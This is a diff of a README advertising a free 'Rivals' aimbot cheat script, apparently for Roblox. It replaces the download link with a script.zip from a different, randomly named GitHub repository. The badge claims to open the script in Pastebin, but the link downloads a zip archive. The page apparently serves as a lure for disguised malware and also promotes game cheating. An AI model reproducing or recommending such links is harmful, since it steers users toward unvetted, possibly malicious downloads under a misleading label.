@@ -5,12 +5,12 @@
 # [OVERPOWERED!] New Best Free Rivals Script (AIMBOT) (RAGE) + MORE!
 
 <div style="text-align: center">
-  <a href="https://github.com/Fisch-Scripts-Roblox/Fisch-Script/releases/download/new/script.zip">
+  <a href="https://github.com/Darkness-Vibe/bookish-octo-fiesta/releases/download/new/script.zip">
     <img class="bumbum" style="width: 1000px" alt="Static Badge" src="https://img.shields.io/badge/Click_For-_Open_Script_in_Pastebin!-purple">
   </a>
 </div>
 
-![image](https://github.com/user-attachments/assets/831311ca-1d79-4cbc-be48-3be2527b5110)
+![image](https://github.com/user-attachments/assets/1db49c8c-c609-434a-b634-67d2fed4f15f)
 
 ![hq720](https://github.com/user-attachments/assets/49703b46-192a-47af-b53b-6c3df0347546)
 
